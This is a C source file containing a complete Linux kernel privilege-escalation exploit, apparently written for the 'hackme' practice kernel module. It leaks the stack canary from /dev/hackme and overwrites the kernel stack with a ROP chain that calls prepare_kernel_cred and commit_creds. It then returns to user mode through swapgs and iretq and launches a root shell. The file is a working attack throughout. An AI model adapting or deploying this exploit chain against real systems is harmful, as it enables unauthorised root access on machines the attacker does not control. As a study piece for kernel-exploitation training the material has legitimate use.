#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <sys/types.h>

#define CANARY_SIZE 0x8
#define BUF_MAX 0x180
#define CANARY_OFFSET 0x80

void pop_shell(void);

uint64_t g_cs, g_rflags, g_sp, g_ss;
uint64_t g_rip = (uint64_t) pop_shell;

// ROPs
const uint64_t g_iretq        = 0xffffffff814381cb;         // iretq; pop rbp; ret;
const uint64_t g_pop_rdi      = 0xffffffff81006370;         // pop rdi; ret;
const uint64_t g_pop_rax      = 0xffffffff81004d11;         // pop rax; ret;
const uint64_t g_call_rax     = 0xffffffff81c0037f;         // call rax; ret;
const uint64_t g_mov_rax_rdi  = 0xffffffff816bf203;         // mov rdi, rax; mov qword ptr [rsi + 0x140], rdi; pop rbp; ret; 
const uint64_t g_pop_rsi      = 0xffffffff8150b97e;         // pop rsi; ret;
const uint64_t g_swapgs       = 0xffffffff8100a55f;         // swapgs; pop rbp; ret;
const uint64_t g_commit_creds = 0xffffffff814c6410;
const uint64_t g_prepare_kernel_cred = 0xffffffff814c67f0;

int dev_open(const char *devname) {
    int fd = open(devname, O_RDWR);
    if (fd < 0) {
        fprintf(stderr, "[-] Failed to open %s.", devname);
        exit(EXIT_FAILURE);
    }
    return fd;
}

void pop_shell(void) {
    uid_t uid = getuid();
    printf("[+] Shell UID: %u\n", uid);
    if (uid != 0) {
        fprintf(stderr, "[-] Failed to escalate priveleges.");
        exit(-1);
    }
    system("/bin/sh");
    exit(0);  // Exit pre-emptively to avoid segmentation fault.
}

bool is_canary(uint64_t leak) {
    uint16_t prefix = leak >> 48;
    uint8_t null_byte = leak & 0xff;
    return ((prefix != 0xffff) && (null_byte == 0) && (prefix != 0));
}

uint64_t leak(int fd) {
    size_t   bytes_read  = 0;
    uint64_t canary      = 0;

    int size = BUF_MAX / 8;
    uint64_t leak[size + 10];
    bytes_read = read(fd, leak, BUF_MAX);
    if (bytes_read < 0) {
        fprintf(stderr, "[-] Failed to read.");
        goto LEAK_EXIT;
    }

    printf("[+] Beginning leak:\n");
    printf("\tOffset:\tLeak Data\n");
    /* For whatever reason, the canary appears three times in the leak. Once
       inside the `tmp` variable on the stack (improper initialization?), once
       0x80, again at 0xf0 for a different stack frame. The 0x80 location is
       actual canary location offset
    */
    for (int idx = 0; idx < size; idx++) {
        printf("\t0x%lx:\t0x%016lx", idx * sizeof(canary), leak[idx]);
        if (is_canary(leak[idx])) {
            printf("  CANARY CANDIDATE");
            canary = leak[idx];
        }
        printf("\n");
    }
    printf("[+] Leak complete\n");

LEAK_EXIT:
    return canary;
}

void save_state(void) {
    printf("[+] Saving state...\n");
    __asm__(
        ".intel_syntax noprefix;"
        "mov g_cs, cs;"
        "mov g_ss, ss;"
        "mov g_sp, rsp;"
        "pushf;"
        "pop g_rflags;"
        ".att_syntax;"
    );
    printf("[+] State saved.\n");
}

void exploit(int fd, uint64_t canary) {
    int size = BUF_MAX / 8;
    int idx = CANARY_OFFSET / 8;
    uint64_t payload[size + 1];

    payload[idx++] = canary;
    payload[idx++] = 0x4141414141414141;
    payload[idx++] = 0x4242424242424242;
    payload[idx++] = 0x4343434343434343;
    payload[idx++] = g_pop_rdi;           // RIP offset
    // payload[idx++] = 0x4545454545454545;           // RIP offset
    payload[idx++] = 0;
    payload[idx++] = g_prepare_kernel_cred;
    payload[idx++] = g_mov_rax_rdi;
    payload[idx++] = 0;
    payload[idx++] = g_commit_creds;
    payload[idx++] = g_swapgs;
    payload[idx++] = 0;
    payload[idx++] = g_iretq;
    payload[idx++] = g_rip;
    payload[idx++] = g_cs;
    payload[idx++] = g_rflags;
    payload[idx++] = g_sp;
    payload[idx++] = g_ss;

    printf("[+] Delivering payload...\n");
    write(fd, payload, sizeof(payload));
}

void segvHandler(int dummy) {
    pop_shell();
}

int main(int argc, char **argv) {
    int      devfd      = 0;
    uint64_t canary     = 0;

    signal(SIGSEGV, segvHandler);
    devfd = dev_open("/dev/hackme");
    canary = leak(devfd);
    if (canary == 0) {
        fprintf(stderr, "[-] Failed to leak canary.\n");
        goto EXIT;
    }
    printf("[+] Canary: 0x%016lx\n", canary);
    save_state();
    exploit(devfd, canary);

EXIT:
    close(devfd);
    return 0;
}
